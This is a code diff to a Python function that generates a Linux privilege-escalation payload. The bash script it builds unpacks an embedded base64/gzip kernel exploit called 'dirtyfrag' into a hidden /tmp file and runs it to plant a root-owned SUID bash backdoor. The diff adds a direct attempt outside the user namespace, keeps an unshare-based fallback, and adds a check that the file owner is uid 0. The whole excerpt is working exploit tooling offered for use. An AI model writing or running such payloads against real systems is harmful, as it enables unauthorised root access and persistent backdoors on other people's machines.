@@ -696,6 +696,11 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
         if not df_src.exists():
             return None
         df_b64 = base64.b64encode(gzip.compress(df_src.read_bytes(), 9)).decode()
+        # dirtyfrag must run OUTSIDE the user namespace so the SUID bash it plants
+        # is owned by real uid=0 (not by the real user remapped as uid=0 in ns).
+        # Fallback: retry inside user namespace in case the target needs namespace
+        # capabilities (CAP_NET_ADMIN/CAP_SYS_ADMIN) to trigger the kernel bug.
+        # Success requires stat owner == 0, not just the SUID bit.
         script = "\n".join([
             "#!/bin/bash",
             f"BD={bd}",
@@ -704,14 +709,21 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
             "T=$(mktemp /tmp/.XXXXXXXX)",
             f"printf '%s' '{df_b64}' | base64 -d | gunzip > \"$T\"",
             "chmod +x \"$T\"",
-            "export BD T",
-            "unshare --user --map-root-user --net -- bash -c 'printf \"cp /bin/bash $BD; chmod +s $BD; exit\\n\" | $T 2>&1' 2>&1",
+            # attempt 1: direct (no namespace) — real root if kernel exploit succeeds
+            "printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | \"$T\" 2>&1",
+            "if ! [ -u \"$BD\" ] || [ \"$(stat -c %u \"$BD\" 2>/dev/null)\" != \"0\" ]; then",
+            # attempt 2: via user namespace (namespace caps may unlock exploit path)
+            "    rm -f \"$BD\" 2>/dev/null",
+            "    export BD T",
+            "    unshare --user --map-root-user --net -- bash -c 'printf \"cp /bin/bash $BD; chmod +s $BD; exit\\n\" | \"$T\" 2>&1' 2>&1",
+            "fi",
             "rm -f \"$T\"",
-            "if [ -u \"$BD\" ]; then",
+            "if [ -u \"$BD\" ] && [ \"$(stat -c %u \"$BD\" 2>/dev/null)\" = \"0\" ]; then",
             "    echo '[privesc:ok] fragnesia-dirtyfrag'",
             "    $BD -p -c 'id'",
             "else",
-            "    echo '[privesc:fail] fragnesia-dirtyfrag'",
+            "    rm -f \"$BD\" 2>/dev/null",
+            "    echo '[privesc:fail] fragnesia-dirtyfrag — could not plant root-owned SUID bash'",
             "fi",
         ]) + "\n"
         b64 = base64.b64encode(script.encode()).decode()
